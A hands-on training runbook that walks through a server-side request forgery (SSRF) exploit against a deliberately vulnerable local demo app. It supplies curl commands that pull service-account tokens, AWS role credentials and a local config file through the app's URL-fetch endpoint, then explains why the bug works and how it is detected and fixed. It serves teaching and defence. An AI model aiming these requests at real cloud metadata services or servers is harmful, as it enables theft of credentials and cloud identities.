Corefile · Hands-on security demo

SSRF Exploit Runbook

Turn a harmless "fetch a file by URL" feature into theft of a cloud workload's identity — on your own laptop, in about five minutes.

⚠️
Safe by design. Everything here runs on 127.0.0.1 against an intentionally vulnerable demo app. Every credential the exploit "steals" is a randomly generated fake in a real format — none maps to a live account. Do not deploy the app or run this against anything you don't own.

What this shows

A Server-Side Request Forgery (SSRF, CWE-918) lets an attacker make the server issue requests on their behalf. Because the server sits inside the trust boundary, those requests reach places the attacker can't — internal services and, most damagingly, the cloud instance-metadata endpoint that hands out the workload's credentials.

Corefile has an "Attach remote corefile" feature: paste a URL to a symbol server or a teammate's shared dump, and Corefile fetches it for you. It never checks where the URL points and returns the response body — so you can steer it anywhere and read what comes back.

  • Python 3
  • curl
  • the corefile repo, checked out
  • ~5 minutes

§ Setup — two terminals

Terminal A — the target

A stand-in for the cloud metadata service (169.254.169.254), which you can't reach from a laptop. It logs each request, so you can watch the SSRF land.

metadata mock · :8081
python3 demo/ssrf/metadata_mock.py

Terminal B — Corefile

The vulnerable app. Serves on 127.0.0.1:8000. Leave it running.

corefile · :8000
python app.py

You'll drive the exploit from a third terminal with curl. Add | python3 -m json.tool to any command to pretty-print the JSON. If port 8000 is busy, start Corefile on another port and adjust the URLs.

§ The exploit

1

A benign-looking fetch

First use the feature as intended — point it at the mock's front page. Corefile fetches the URL for you.

attacker@laptop
curl -s 'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/'

Look at Terminal A: the request arrives from 127.0.0.1 — the server made it, not you. That's the whole game. Now point the server somewhere it shouldn't go.

2

Steal the cloud service-account token the payoff

Aim the same feature at the metadata service. On a real cloud host this URL is http://169.254.169.254/… or http://metadata.google.internal/…; the mock serves the identical path on loopback.

attacker@laptop
curl -s 'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/computeMetadata/v1/instance/service-accounts/default/token'
the workload's token walks back to you
{
  "access_token": "ya29.DEMO-FAKE-DO-NOT-USE-a1B2c3D4e5F6g7H8i9J0kL...",
  "expires_in": 3599,
  "token_type": "Bearer"
}

That token is the identity of the pod/VM. With it, the attacker becomes the workload — calling whatever cloud APIs that service account is allowed to (buckets, registries, secret stores) from their own machine. Confirm whose identity it is:

attacker@laptop
curl -s 'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/computeMetadata/v1/instance/service-accounts/default/email'
identity
corefile-forensics@corefile-demo.iam.gserviceaccount.com
3

Same bug, more reach

SSRF is reach, not one URL. The same endpoint hits other clouds and other schemes — driving home why one blocked path never fixes it.

AWS IMDSv1 role credentials
curl -s 'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/latest/meta-data/iam/security-credentials/corefile-forensics-role'
file:// — read a local file off the server
curl -s "http://127.0.0.1:8000/api/fetch?url=file://$(pwd)/config.py"

Bonus: that last one reads Corefile's own config.py off disk — leaking every hardcoded secret in it — without the attacker ever seeing the source.

Why it works

No scheme check

file:// and others are live, not just http.

No host check

Link-local 169.254.169.254 and localhost-only services are in reach.

No IP validation

A public name that resolves to a private address — or a redirect to one — still lands.

Body returned

The response comes back to the caller, turning "can reach" into "can read": full-read SSRF.

One honest caveat. Real GCP metadata requires a Metadata-Flavor: Google header a URL-only SSRF can't set — so that exact path would 403 on real GCP. But AWS IMDSv1 and most internal services need no such header (shown above), and many real SSRFs let the attacker influence headers too. The header and AWS IMDSv2 exist because of this class of bug.

How it's caught & fixed

  • SAST / review — flags a URL fetch built from request input with no allowlist (CWE-918) before it ships.
  • DAST — hits /api/fetch unauthenticated with a callback / metadata probe and catches it at runtime, no source needed.
  • Cloud posture — least-privilege on the service account and enforced IMDSv2 / metadata concealment shrink the blast radius of a stolen token.
  • Fix at the sink — allowlist scheme and host, resolve and reject private / link-local / loopback ranges before connecting, disable redirects, and never return the raw body.
Corefile is an intentionally vulnerable demonstration target. Loopback only · fake credentials · kill -11 to reproduce. Stop both servers with Ctrl-C when you're done.
